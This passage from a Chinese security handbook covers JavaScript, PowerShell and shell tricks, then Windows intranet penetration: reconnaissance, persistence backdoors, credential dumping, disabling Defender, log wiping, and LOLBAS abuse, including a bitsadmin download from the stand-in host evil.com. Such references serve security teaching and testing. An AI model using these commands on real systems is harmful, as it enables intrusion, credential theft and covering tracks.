-   \'r\' \> (\[\]+!+\[\])\[+!+\[\]\]

-   \'s\' \> (\[\]+!\[\])\[+!+\[\]+!+\[\]+!+\[\]\]

-   \'t\' \> (\[\]+!+\[\])\[+\[\]\]

-   \'u\' \> (\[\]+!+\[\])\[+!+\[\]+!+\[\]\]

### 5.4.11 Trick

**通过正则表达式构造特定字符**

```js
empty = RegExp.prototype.flags
regSource = { ...RegExp.prototype.source }
regSource.toString = Array.prototype.shift
regSource.length = 4
left = regSource + empty // 生成 (
quest = regSource + empty // 生成 ?
colon = regSource + empty // 生成 :
right = regSource + empty // 生成 )
xss = {}
xss.source = 'xss'
xss.flags = 'a'
xss.toString = RegExp.prototype.toString
xss + "" // => /xss/a
```

### 5.4.12 其他

#### 命令执行

Node.js 中 child_process.exec 命令调用的是 /bin/sh ，故可以直接使用该命令执行 shell

#### 反调试技巧

-   函数重定义 console.log = function(a){}

-   定时断点 setInterval(function(){debugger}, 1000);

#### 对象拷贝

JavaScript 中的对象拷贝分为浅拷贝和深拷贝。

浅拷贝对一个对象进行拷贝时，仅仅拷贝对象的引用进行拷贝，但是拷贝对象和源对象还是引用同一份实体。其中一个对象的改变都会影响到另一个对象。

深拷贝拷贝一个对象时，不仅仅把对象的引用进行复制，还把该对象引用的值也一起拷贝。源对象与拷贝对象互相独立，其中任何一个对象的改动都不会对另外一个对象造成影响。

深拷贝可以基于 for-in / object.assign() / 拓展运算符 \... / JSON.parse(JSON.stringify()) 等方式实现。其中前三种方式只对第一层做深拷贝，若对象结构较为复杂，则需要用递归的方式对更深的层次进行拷贝。

#### 常见 Sink

-   child_process

-   eval

-   exec

-   execSync

### 5.4.13 参考链接

-   [JavaScript 反调试技巧](http://www.freebuf.com/articles/system/163579.html)
-   [ECMAScript Language Specification](http://www.ecma-international.org/ecma-262/5.1/#sec-15.3.4.5)
-   [js prototype](https://www.zhihu.com/question/34183746?sort=created)
-   [javascript 防劫持](https://github.com/scscms/guardJs/)
-   [XSS 前端防火墙](http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-3.html)
-   [exploiting node js deserialization bug for remote code execution](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
-   [Prototype pollution attack](https://github.com/HoLyVieR/prototype-pollution-nsec18/) Content released at NorthSec 2018 on prototype pollution



## 5.5 Golang

### 5.5.1 Golang Runtime

Go 中的线程被称为 Goroutine 或 G，内核线程被称为 M。这些 G 被调度到 M 上，即所谓的 G：M 线程模型，或更常用的 M：N 线程模型，用户空间线程或 green 线程模型。

### 5.5.2 字符串处理

-   Go 源代码始终为 UTF-8

-   代表 Unicode 码点的字节序列称为 rune

-   Go 不保证字符串中的字符被规范化

-   字符串可以包含任意字节

-   字符串中不包含字节级转义符时，字符串始终包含有效的 UTF-8 序列

### 5.5.3 参考链接 

-   [Strings, bytes, runes and characters in Go](https://blog.golang.org/strings)

&nbsp;

## 5.6 Ruby

### 5.6.1 参考链接 

-   [ruby deserialization](https://www.elttam.com.au/blog/ruby-deserialization/)



## 5.7 ASP

### 5.7.1 简介

ASP 是动态服务器页面 (Active Server Page)，是微软开发的类似 CGI 脚本程序的一种应用，其网页文件的格式是 .asp 。

### 5.7.2 参考链接

-   [Deformity ASP/ASPX Webshell、Webshell Hidden Learning](https://www.cnblogs.com/LittleHann/p/5016999.html)

&nbsp;

## 5.8 PowerShell

### 5.8.1 执行策略

PowerShell 提供了 Restricted、AllSigned、RemoteSigned、Unrestricted、Bypass、Undefined 六种类型的执行策略。

Restricted 策略可以执行单个的命令，但是不能执行脚本，Windows 8、Windows Server 2012 中默认使用该策略。

AllSigned 策略允许执行所有具有数字签名的脚本。

RemoteSigned 当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。

Unrestricted 这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。

BypassBypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并 不会有安全性提示。

UndefinedUndefined 表示没有设置脚本策略，会继承或使用默认的脚本策略。

### 5.8.2 混淆

-   -EC

-   -EncodedCommand

-   -EncodedComman

-   -EncodedComma

-   -EncodedComm

### 5.8.3 常见功能

#### 计划任务

```powershell
$Action = New-ScheduledTaskAction -Execute "calc.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings,$Set
Register-ScheduledTask AtomicTask -InputObject $object
Unregister-ScheduledTask -TaskName "AtomicTask" -confirm:$false
```

#### 创建链接

```powershell
$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start␣
,→Menu\Programs\Startup\test.lnk")
```

#### 5.8. PowerShell 219

```powershell
$ShortCut.TargetPath="cmd.exe"
$ShortCut.WorkingDirectory = "C:\Windows\System32";
$ShortCut.WindowStyle = 1;
$ShortCut.Description = "test.";
$ShortCut.Save()
```

##### 编码

```powershell
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
```

##### 其他

-   **别名**

    -   alias
-   **下载文件**
-   Invoke-WebRequest \"https://example.com/test.zip\" -OutFile \"\$env:TEMP\\test. zip\"
-   **解压缩**
    -  Expand-Archive $env:TEMP\test.zip $env:TEMP\test -Force
-   **进程**
    - 启动进程 Start-Process calc 
    - 停止进程 Stop-Process -ID $pid
-   **文件**
    - 新建文件 New-Item #{file_path} -Force | Out-Null 
    - 设置文件内容 Set-Content -Path #{file_path} -Value "#{Content}" 
    - 追加文件内容 Add-Content -Path #{file_path} -Value "#{Content}" 
    - 复制文件 Copy-Item src dst 
    - 删除文件 Remove-Item #{outputfile} -Force -ErrorAction Ignore 
    - 子目录 Get-ChildItem #{file_path}
-   **服务**
    - 获取服务 Get-Service -Name "#{service_name}" 
    - 启动服务 Start-Service -Name "#{service_name}" 
    - 停止服务 Stop-Service -Name "#{service_name}" 
    - 删除服务 Remove-Service -Name "#{service_name}"

-   获取 WMI 支持 Get-WmiObject -list

    ### 5.8.4 参考链接

    -   [PowerShell 官方文档](https://docs.microsoft.com/zh-cn/powershell/)

    &nbsp;

-   ## 5.9 Shell

    ### 5.9.1 简介

Shell 是一个特殊的程序，是用户使用 Linux 的桥梁。Shell 既是一种命令，又是一种程序设计语言。

Linux 包含多种 Shell ，常见的有：

-   Bourne Shell（ATT 的 Bourne 开发，名为 sh）

-   Bourne Again Shell（/bin/bash）

-   C Shell（Bill Joy 开发，名为 csh）

-   K Shell（ATT 的 David G.koun 开发，名为 ksh）

-   Z Shell（Paul Falstad 开发，名为 zsh）

### 5.9.2 元字符

shell 一般会有一系列特殊字符，用来实现的一定的效果，这种字符被称为元字符（Meta），不同的 Shell 支持的元字符可能会不相同。

常见的元字符如下：

-   IFS 由 \<space\> 或 \<tab\> 或 \<enter\> 三者之一组成
-   CR 由 \<enter\> 产生。
-    = 设定变量

-   \$ 作变量或运算替换

-   \> 重定向 stdout

-   \>\> 追加到文件

-   \< 重定向 stdin

-   \| 命令管道

-   & 后台执行命令

-   ; 在前一个命令结束后，执行下一个命令

-   && 在前一个命令未报错执行后，执行下一个命令

-   \|\| 在前一个命令执行报错后，执行下一个命令

-   \' 在单引号内的命令会保留原来的值

-   \" 在双引号内的命令会允许变量替换

-   '' ' '' 在反引号内的内容会当成命令执行并替换

-   () 在子 Shell 中执行命令

-   {} 在当前 Shell 中执行命令

-   \~ 当前用户的主目录

-   !number 执行历史命令，如 !1

### 5.9.3 通配符

除元字符外，通配符（wildcard）也是 shell 中的一种特殊字符。当 shell 在参数中遇到了通配符时，shell 会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行替换，否则就将该通配符作为一个普通字符直接传递。

常见的通配符如下：

-   \* 匹配 0 或多个字符

-   ? 匹配任意一个字符

-   \[list\] 匹配 list 中的任意一个字符

-   \[!list\] 匹配除 list 外的任意一个字符

-   \[a-c\] 匹配 a-c 中的任意一个字符

-   {string1,string2,\...} 分别匹配其中字符串

2.  ## 5.10 CSharp/C#

    ### 5.10.1 利用技巧

#### P/Invoke

Platform Invoke (P/Invoke) 提供了 C# 访问 DLL 中数据结构、回调、函数的能力。基本的使用方式如官方文档[Platform Invoke](https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) 中所示。利用 P/Invoke 的能力，C# 程序可以较为容易的调用标准的 Windows API。

```shell
using System;
using System.Runtime.InteropServices;
public class Program
{
// Import user32.dll (containing the function we need) and define
// the method corresponding to the native function.
[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption,␣
,→uint uType);
public static void Main(string[] args)
{
// Invoke the function as a regular managed method.
MessageBox(IntPtr.Zero, "Command-line message box", "Attention!", 0);
}
}
```

P/Invoke 的缺点在于引用了的 API 调用会最后出现在可执行文件的 IAT 中，使得一些敏感的行为容易被防护软件所注意。同时一些敏感的 API 可能是被防护软件所监控的，通过这种方式进行的 API 调用也容易被防护软件拦截。

#### D/Invoke

在 P/Invoke 的基础上，有研究人员提出了基于 [Delegates](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/) 机制的 D/Invoke，通过更隐蔽的方式来调用所需的 API。

### 5.10.2 参考链接

**.Net**

-   [.NET documentation](https://docs.microsoft.com/en-us/dotnet/fundamentals/)

**利用技巧**

-   [Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke & API Hooks)](https://thewover.github.io/Dynamic-Invoke/)



# 6.内网渗透

## 6.1 Windows 内网渗透

### 6.1.1 信息收集

#### 基本命令

-   主机名 hostname

-   查询所有计算机名称 dsquery computer

-   **查看配置及补丁信息**
    -   systeminfo
    
    -   wmic qfe get description,installedOn /format:csv
    
-   查看版本 ver

-   **进程信息**
    -   tasklist /svc
    
    -   wmic process get caption,executablepath,commandline /format:csv
    
    -   get-process
    
-   查看所有环境变量 set

-   查看计划任务 schtasks /QUERY /fo LIST /v

-   查看安装驱动 DRIVERQUERY

-   **查看操作系统信息**
    -   架构 wmic os get osarchitecture
    
    -   系统名 wmic os get caption
    
-   查看逻辑盘 wmic logicaldisk get caption

-   查看安装的软件信息 wmic product get name,version

-   **查看服务信息**
-   wmic service list brief
    
-   sc query
    
-   Get-WmiObject win32_service \| select PathName

#### 域信息

-   获取当前组的计算机名 net view

-   网络发现 net view /all

-   查看所有域 net view /domain

-   域森林、域树信息

-   域信任信息 nltest /domain_trusts

-   定位域控 net time /domain

-   查看域中的用户名 dsquery user

-   查询域组名称 net group /domain

-   查询域管理员 net group \"Domain Admins\" /domain

-   **域控信息**
    -   nltest /dclist:xx
    
    -   Get-NetDomain
    
    -   Get-NetDomainController
    
    -   net group \"Domain controllers\"
    
-   组策略

#### 用户信息

-   **查看用户**

    -   net user

    -   whoami / whoami /priv / whoami /all

    -   wmic useraccount get /ALL /format:csv

-   用户特权信息 whoami /priv

-   查看当前权限 net localgroup administrators

-   查看在线用户 quser / qwinsta / query user

-   查看当前计算机名，全名，用户名，系统版本，工作站域，登陆域 net config Workstation

-   ACL 信息 get-acl

#### 网络信息

-   内网网段信息

-   网卡信息 ipconfig

-   外网出口

-   ARP 表 arp -a

-   路由表 route print

-   监听的端口 netstat -ano

-   连接的端口

-   **端口信息**
    -   Get-NetTCPConnection
    
-   hosts 文件

-   主备 DNS

-   **DNS 缓存**
    -   ipconfig /displaydns
    
    -   Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache
    
-   **探测出网情况**
-   *powershell -c "1..65535 \| % {echo ((new-object Net.Sockets.TcpClient).Connect('allports.exposed',\$\_))\$\_ } 2\>\$null"*

#### 防火墙

-   查看防火墙状态 netsh advfirewall show allprofiles

-   防火墙日志目录 netsh firewall show logging

-   防火墙规则 netsh advfirewall firewall show rule name=all

-   netsh firewall show config

-   netsh firewall show state

#### 密码信息

-   Windows RDP 连接记录

-   浏览器中保存的账号密码

-   系统密码管理器中的各种密码

-   **无人值守安装文件中的密码信息**
-   C:\\sysprep.inf
    
-   C:\\sysprep\\sysprep.xml
    
-   C:\\Windows\\Panther\\Unattend\\Unattended.xml
    
-   C:\\Windows\\Panther\\Unattended.xml

#### 票据信息

-   cmdkey /l

-   klist

-   msf meterpreter

#### 特殊文件

-   **文档**
    - xlsx / xls
    - docx / doc
    - pptx / ppt
    - vsdx / vsd
    - md / txt

-   压缩文件
    -   zip / rar / 7z
    
-   VPN 配置
    -   ovpn
    
-   代码
    -   py / php / jsp / aspx / asp / sql
    
-   配置文件
    -   conf / ini / xml
    
-   特定关键字
-   账号 / 账户 / 登录 / login / user
    
-   密码 / pass
    
-   代码 / 文档 / 交接 / 备份 / git / svn
    
-   邮箱 / 通讯录 / 集群 / 办公
    
-   代理 / 内网 / VPN
    
-   设备 / 资产
    
-   系统 / 运维 / 拓扑 / 网络 / IT
    
-   后台 / 管理员 / 数据库
    
-   监控 / 隔离 / 防火墙 / 网闸 / 巡检

#### 局域网存活主机

-   NetBIOS 扫描

-   OXID 扫描

#### 其他

-   启用的共享文件夹

-   回收站

-   最近运行的命令

-   访问文件历史记录

-   **查看补丁安装情况**
    -   wmic qfe get Caption,Description,HotFixID,InstalledOn

-   **日志与事件信息**
    -   wevtutil

    -   eventvwr

-   **注册表信息**
    -   reg

-   安装的各类 agent 监控软件

-   安装的杀毒软件

-   **查看/设置后缀关联**
    -   assoc

    -   assoc .ext=example

-   PowerShell 版本

-   .Net 版本

-   Wi-Fi 密码


### 6.1.2 持久化

#### 隐藏文件

-   **创建系统隐藏文件**

    -   attrib +s +a +r +h filename / attrib +s +h filename

-   利用 NTFS ADS (Alternate Data Streams) 创建隐藏文件

-   **利用 Windows 保留字**
-   aux\|prn\|con\|nul\|com1\|com2\|com3\|com4\|com5\|com6\|com7\|com8\|com9\|lpt1\|lpt2\|lpt3\|lpt4\|lpt5\|lpt6

#### 后门

sethc.exe 是 Windows 系统在用户按下五次 shift 后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换 sethc.exe 的方式留下后门，在密码输入页面输入五次 shift 即可获得权限。

#### 映像劫持

在高版本的 Windows 中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。

具体操作为在注册表的 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Option 下添加项 sethc.exe ，然后在 sethc.exe 这个项中添加 debugger 键，键值为恶意程序的路径。

#### 定时任务

Windows 下有 schtasks 和 at 两种计划任务机制。其中 at 在较高版本的 Windows 中已经弃用。

设置命令为 schtasks /create /tn \"TEST_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\" 、 schtasks /create /tn \"TEST_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\" 。删除命令为 schtasks /delete /tn \"TEST_OnLogon\" /f 。

#### 登录脚本

Windows 可 以 在 用 户 登 录 前 执 行 脚 本， 使 用 HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit 设置。

也可在 HKCU\\Environment\\ 路径下设置 UserInitMprLogonScript 来实现。

#### 屏幕保护程序

Windows 可以自定义屏幕保护程序，使用 HKEY_CURRENT_USER\\Control Panel\\Desktop 设置。

#### 隐藏用户

Windows 可以使用在用户名后加入 \$ 来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。

在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看。

#### CLR

CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET 产品构建的运行环境，可以粗略地理解为.NET 虚拟机。

.NET 程序的运行离不开 CLR，因此可以通过劫持 CLR 的方式实现后门。

#### Winlogon Helper DLL 后门

Winlogon 是一个 Windows 组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在 Windows 登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。

**注册表位置如下：**

-   HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell 用于执行 exe 程序

-   HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit 用于执行 exe 程序

-   HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify 用于执行 dll 文件

#### 自启动

##### 基于注册表的自启动

通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是 Run 和 RunOnce ，其中 RunOnce 和

Run 区别在于 RunOnce 的键值只作用一次，执行完毕后会自动删除。注册表如下：

-   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

-   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce

-   HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

-   HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce

-   HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx

基于策略的自启动注册表设置如下：

-   HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run

-   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run

设置启动文件夹注册表位置如下：

-   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders

-   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders

-   HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders

-   HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders

设置服务启动项注册表位置如下：

-   HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce

-   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce

-   HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices

-   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices

用户自启动位置HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit、HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell ， 其 中Userinit 键允许指定用逗号分隔的多个程序。

如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：

-   HKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaveActive

-   HKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaverIsSecure

-   HKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaveTimeOut

-   HKEY_CURRENT_USER\\Control Panel\\Desktop\\SCRNSAVE.EXE

##### 基于特定目录的自启动

自启动目录，C:\\Users\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup目录对特定用户生效，C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp 对所有用户生效。在 NT6 以前，两个目录为 C:\\Documents and Settings\\Username\\Start Menu\\Programs\\StartUp

/ C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\StartUp 。

### 6.1.3 权限

#### UAC

UAC (User Account Control) 是 Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。

当用户登陆 Windows 时，每个用户都会被授予一个 access token，这个 token 中有 security identifier (SID)的信息，决定了用户的权限。

#### 会触发 UAC 的操作

-   以管理员权限启动应用

-   修改系统、UAC 设置

-   修改没有权限的文件或者目录（%SystemRoot% / %ProgramFiles% 等）

-   修改 ACL (access control list)

-   安装驱动

-   增删账户，修改账户类型，激活来宾账户

#### ByPass

-   DLL 相关

-   进程注入

-   注册表

#### 权限提升

权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的 UAF 或者其他类似的漏洞，以获得较高的权限。

逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。

#### 任意写文件利用

在 Windows 中用户可以写的敏感位置主要有以下这些

-   用户自身的文件和目录，包括 AppData Temp
-   C:\\ ，默认情况下用户可以写入
-   C:\\ProgramData 的子目录，默认情况下用户可以创建文件夹、写入文件
-   C:\\Windows\\Temp 的子目录，默认情况下用户可以创建文件夹、写入文件

具体的 ACL 信息可用 AccessChk, 或者 PowerShell 的 Get-Acl 命令查看。

可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的 dll，利用 dll 的加载执行来获取权限。

#### MOF

MOF 是 Windows 系统的一个文件（c:/windows/system32/wbem/mof/nullevt.mof ）叫做" 托管对象格式"，其作用是每隔五秒就会去监控进程创建和死亡。

当拥有文件上传的权限但是没有 Shell 时，可以上传定制的 mof 文件至相应的位置，一定时间后这个 mof 就会被执行。

一般会采用在 mof 中加入一段添加管理员用户的命令的 vbs 脚本，当执行后就拥有了新的管理员账户。

#### 凭证窃取

**Windows 地密码散列导出工具**

-   mimikatz
-   lsass
-   wce
-   gsecdump
-   copypwd
-   Pwdump
-   **ProcDump**
    - https://docs.microsoft.com/en-us/sysinternals/downloads/procdump>

**Windows 地密码破解工具**

-   L0phtCrack

-   SAMInside

-   Ophcrack

彩虹表破解

本机 hash+ 明文抓取

win8+win2012 明文抓取

ntds.dit 的导出 +QuarkPwDump 读取分析

vssown.vbs + libesedb + NtdsXtract

ntdsdump

利用 powershell(DSInternals) 分析 hash

使用 net use \\\\%computername% /u:%username% 重置密码尝试次数

限制读取时，可 crash 操作系统后，在蓝屏的 dump 文件中读取

#### 其他

-   组策略首选项漏洞

-   DLL 劫持

-   替换系统工具，实现后门

-   **关闭 defender**
    -   Set-MpPreference -disablerealtimeMonitoring \$true


### 6.1.4 痕迹清理

#### 日志

-   查看日志 eventvwr

-   伪造日志 eventcreate

-   **操作日志**
    -   3389 登录列表
    
    -   文件打开日志
    
    -   文件修改日志
    
    -   浏览器日志
    
    -   系统事件
    
    -   程序安装记录
    
    -   程序删除记录
    
    -   程序更新记录
    
-   **登录日志**
    -   系统安全日志
    
-   **日志路径**
    -   系统日志 %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx
    
    -   安全日志 %SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx
    
    -   应用程序日志 %SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx
    
-   **服务日志**
-   IIS %SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1\\

#### 注册表

-   AppCompatFlags

-   Background Activity Moderator (BAM)

-   MuiCache

-   RecentApps

-   RunMRU

-   ShimCache (AppCompatCache)

#### 注册表键

-   HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog

#### 文件

##### Prefetch

预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为 PF。位置在 C:\\Windows\\Prefetch 。

##### JumpLists

记 录 用 户 最 近 使 用 的 文 档 和 应 用 程 序， 方 便 用 户 快 速 跳 转 到 指 定 文 件， 位 置 在 %APPDATA%\\Microsoft\\Windows\\Recent 。

##### Amcache / RecentFileCache.bcf

Windows 中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间。

在 Windows 7、Windows Server 2008 R2 等 系 统 中， 文 件 保 存 在 C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf ， 包含程序的创建时间、 上次修改时间、上次访问时间和文件名。

在 Windows 8、Windows 10、Windows Server 2012 等 系 统 中， 文 件 保 存 在 C:\\Windows\\AppCompat\\Programs\\Amcache.hve ， 包含文件大小、版本、sha1、二进制文件类型等信息。

#### 时间轴

Windows 时间轴是 Windows 10 在 1803 版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等，

#### 彻底删除

-   多次覆写文件 cipher /w:\<path\>

-   格式化某磁盘 count 次 format D: /P:\<count\>

### 6.1.5 横向移动

#### 常见入口

-   SMB 弱密码

-   SqlServer 弱密码

#### LOLBA

LOLBAS，全称 Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在 2013 年 DerbyCon 由 Christopher Campbell 和 Matt Graeber 发现，最终 Philip Goh 提出的概念。

这些程序一般有有 Microsoft 或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过 UAC、绕过程序控制等。

#### 常见程序

-   **appsyncvpublishing.exe**

    -   执行 powershell

-   **bitsadmin.exe**
-   下载文件 bitsadmin /transfer \<job_name\> /priority \<priority\> \<remote_path\>\<local_path\>

-   下载文件 bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns. exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1

-   复制文件 bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd. exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset

-   代码执行 bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd. exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset

-  cdb.exe

- certutil.exe
  - 可安装、备份、删除、管理和执行证书
  - 证书存储相关功能
  - 下载文件 certutil -urlcache -split -f https://addr/example.exe
  - 注意 certutil 是有 cache 的，需要显式删除
  - base64 编解码 certutil -encode / certutil -decode

-   cmd.exe
-   cmstp.exe
-   **control.exe**
    -   [加载 dll](https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/)
-   **csc.exe**
    -   编译 C# 载荷
-   **cscript.exe**
    -   执行脚本
-   extexport.exe
-   **expand.exe**
    -   展开一个或多个压缩文件
-   **forfiles.exe**
    -   forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe
-   mofcomp.exe
-   makecab.exe
-   **msbuild.exe**
    -   构建应用程序
-   **mshta.exe**
    -   HTML 应用
-   **msiexec.exe**
    -   安装 msi

    -   加载 dll
-   **msxsl.exe**
    -   处理 XSL 程序
-   netsh.exe
-   **installutil.exe**
    -   安装/卸载程序组件
-   **IEExec.exe**
    -   .NET Framework 附带程序
-   powershell.exe
-   **psexec.exe**
    -   <https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec>
-   **reg.exe**
    -   注册表控制台
-   **regedit.exe**
    -   注册表修改
-   **regsvr32.exe**
    -   注册动态链接库/ActiveX 控件
-   **rundll32.exe**
    -   执行 DLL 文件中的内部函数
-   **sc.exe**
    -   查看服务状态管理
-   **schtasks.exe**
    -   定时计划任务
-   **shred**
    -   重复写入文件，防止文件恢复
-   **type.exe**
    -   利用 ads 隐藏文件 type \<filepath\> \<target_file:ads\>
-   **wmic.exe**
    -   Windows 管理工具
-   windbg.exe
-   winrm.exe
-   **wscript.exe**
    -   脚本引擎
-   **waitfor.exe**
    -   用于同步网络中计算机，可以发送或等待系统上的信号。


### 6.1.6 域渗透

#### 用户

Windows 系统存在一些为了特定用途而设置的用户，分别是：SYSTEM(系统)、Trustedinstaller(信任程序模块)、Everyone(所有人)、Creator Owner(创建者) 等，这些特殊用户不属于任何用户组，是完全独立的账户。其中 SYSTEM 拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限。

#### 用户组

Windows 系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限。

默认情况下，系统为用户分了 7 个组，并给每个组赋予不同的操作权限。这些组为：管理员组 (Administrators)、高权限用户组(Power Users)、普通用户组 (Users)、备份操作组 (Backup Operators)、文件复制组 (Replicator)、来宾用户组 (Guests)、身份验证用户组 (Authenticated Users)。

#### 工作组

工作组（Workgroup）是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为 workgroup 的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况。

#### 域用户

域环境中的用户和本地用户的帐户不同，域用户帐户保存在活动目录中。在域环境中，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用 SID (Security Identifier) 来表明身份，用 NTLM 哈希或者 Kerberos 来验证身份。

#### 机器用户

机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以 \$结尾。

#### 组策略

组策略 (Group Policy) 用于控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略 (LGPO 或 LocalGPO)，可以在独立 非域的计算机上管理组策略对象。在域环境中的组策略通常被称作 GPO(Group Policy Object)。

#### 内网常用协议

Windows 查询名称解析的顺序为 DNS、mDNS、LLMNR、NBNS。

#### NetBIOS

NetBIOS（Network Basic Input/Output System）是基于网络的交互协议，通常使用 UDP 137、UDP 138、 TCP 139 等端口。Windows 在安装 TCP/IP 协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问。

